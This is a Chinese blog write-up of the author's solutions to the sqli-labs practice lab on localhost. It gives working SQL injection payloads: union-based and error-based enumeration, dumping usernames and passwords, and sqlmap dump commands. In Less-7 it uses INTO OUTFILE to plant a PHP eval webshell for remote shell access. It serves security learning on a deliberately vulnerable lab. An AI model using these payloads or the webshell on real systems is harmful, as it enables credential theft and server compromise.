---
layout:     post                    # 使用的布局（不需要改）
title:      sqli-labs做题记录               # 标题 
subtitle:   Basic Challenges #副标题
date:       2019-08-15              # 时间
author:     Von                      # 作者
header-img: img/post-bg-mma-5.jpg    #这篇文章标题背景图片
catalog: true                       # 是否归档
tags:                               #标签
    - Web
    - SQL

---

# 前言
这几天也算是为了记录自己的成长过程来更新sqli-labs的做题记录。不知道能不能更完，毕竟总共有75关。不管怎么样，努力做到不咕吧。  
受限于篇幅设置，我对于每一关的原理肯定没有办法讲得特别详细，但我会尽量讲得通俗易懂，并且给出相应的参考文章。  
同时，对于类型相同的题目，我尽量给出不同的解法，来充实，提高自己。  

# Less-1

这题的考点是union联合查询注入。
对于这种类型，我推荐小白可以去看看这两篇文章。  
[文章1](https://zhuanlan.zhihu.com/p/22397455)      [文章2](https://zhuanlan.zhihu.com/p/22397620)   
我们先来判断注入类型。  
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' and 1=2 --+
```
经这两者判断，第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是单引号类型注入。
先判断字段数。依次递增order by 后面的数值。
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 2 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 3 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1' order by 4 --+
```
发现3时不报错,而4时报错，所以字段数是3。  
接下来用联合查询判断显示位。首先我们要让id变成一个不存在的值以便显示出来的值都是union语句执行的结果。在这里我们使用100。
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,3 --+
```
![](http://VonLYC.github.io/img/blog9-1.png)
可以看出,显示位为2和3。接下来便是常规操作：
```
爆库:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,database() --+
爆表:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
爆字段:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='users' --+
爆值:http://127.0.0.1/sqli-labs-master/Less-1/?id=100' union select 1,2,group_concat(username,0x3a,password,0x3c2f62723e) from security.users --+
```
至此，一次sql注入便完成了。

# Less-2
这道题和上面那道其实很类似。
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1 and 1=2 --+
```
第一种传入网站显示正常，第二种传入网站显示不正常。可以看出我们的语句已经被执行。因此说明是数值类型注入。  
之后的注入类型与Less-1雷同(仅需把单引号去掉而已)。不再赘述。

# Less-3
我们先传入id=1',可以得到这样的报错信息。
```
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1 
```
![](http://VonLYC.github.io/img/blog9-2.png)
由此看出，我们需要闭合').
```
http://127.0.0.1/sqli-labs-master/Less-1/?id=1') and 1=1 --+
http://127.0.0.1/sqli-labs-master/Less-1/?id=1') and 1=2 --+
```
经同上面的判断，可以看出代码已被执行。之后的注入过程雷同Less-1.

# Less-4
我们传入id=1"，可以得到这样的报错信息。
```
 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"1"") LIMIT 0,1' at line 1  
```
![](http://VonLYC.github.io/img/blog9-3.png)
由此看出，我们需要闭合")。之后的过程类似Less-1.

---
由此看出，这四题主要区别就是在闭合符号的区别，实际应用中我们一方面可以通过报错信息来判断需要闭合的符号。也可以采用burp suite跑字典来进行Fuzz。

# Less-5
经过测试，该题没有显示位。故不能再使用union联合注入。应该考虑布尔盲注，延时注入和报错注入。由于此题存在报错反馈，于是我们采取报错注入。关于报错注入，可以看看我的这篇博客  [网址](http://www.v0n.top/2019/08/12/SQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/)  

```
爆库:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
```
需要注意的是，输出的结果末端带有一个1，这个1是floor报错语句中输出的也一部分（无论输出什么结果，都会有这个1）。我们无视它就可以了。
```
爆表:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
```
在爆表的过程中发现它会爆出错误。
![](http://VonLYC.github.io/img/blog9-4.png)
这里发现页面提示我输出信息超过一行，所以我们要采用limit语句来控制输出。于是有：
```
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 1,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 2,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 3,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
```
```
爆字段:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
爆值:http://127.0.0.1/sqli-labs-master/Less-5/?id=1' and (select 1 from (select count(*),concat((select concat(username,0x3a,password) from security.users limit 0,1),floor (rand(0)*2))x from information_schema.tables group by x)a)--+
根据limit不断递增即可得到全部值。
```
这道题也可以采用布尔盲注(当然延时注入也可以，只不过延时注入我觉得比较高级一些，在下面的题目再讲）
布尔盲注是通过界面的变化来判断语句的执行结果(例如本题的you are in)。但是纯手工注入一般极其耗时(我当时有一次注了一个小时还没注完)  
因此我们一般使用python脚本/burp suite/sqlmap来进行注入。  
我在这里演示一种最简单的sqlmap法(懒。。。。）  
```
判断能否注入:python2 sqlmap.py -u  "http://127.0.0.1/sqli-labs-master/Less-5/?id=1"
```
![](http://VonLYC.github.io/img/blog9-5.png)
从图片可以看出，这里是存在注入的。
```
爆库:python2 sqlmap.py -u  "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" --dbs
爆表:python2 sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" -D security --tables
爆字段:python2 sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" -D security -T users --columns
爆值:python2 sqlmap.py -u "http://127.0.0.1/sqli-labs-master/Less-5/?id=1" -D security -T users -C username,password --dump
```
不得不说，虽然成为一名脚本小子不是我的本意，但是像sqlmap这样的软件还是大大提高了测试的效率(真香。。。)

# Less-6
该题和Less-5几乎一样，唯一的区别就在于闭合符号的不同。在这里我演示一下利用burp suite进行Fuzz的过程。  
我们先将传入的'设置为负载点。  
![](http://VonLYC.github.io/img/blog9-6.png)
再添加burp suite自带的sqli Fuzz字典。(当然字典也可以自己添加,GitHub上一大堆)  
![](http://VonLYC.github.io/img/blog9-7.png)
从攻击返回的测试结果中我们可以发现传入的参数为"时报错，也就说明我们需要闭合"。
![](http://VonLYC.github.io/img/blog9-8.png)
之后的注入过程便雷同Less-5了。

# Less-7
这题是有关文件读取与注入的。这种题目一般有两个难点。  
1.要有读取文件的权限  
2.要知道绝对物理路径  
对于这道题，我们先经过fuzz确定需要闭合'))。又由于我们是本机操作所以默认知道了绝对路径。因此上传一句话木马。  
```
http://127.0.0.1/sqli-labs-master/Less-7/?id=1'))UNION SELECT 1,2,'<?php @eval($_post[“von”])?>' into outfile "C:\\AppServ\\www\\von.php"--+
```
之后使用中国菜刀连接即可getshell。  
注意:地址中的每个\都要在前面加上另外一个\来转义

# Less-8
经过简单测试，这道题我们需要闭合'。和Less-5一样没有显示位。但是和Less-5的区别在于过滤了报错语句，所以我们不能使用报错注入，只能使用布尔盲注和延时注入。在这里我们使用布尔盲注。  











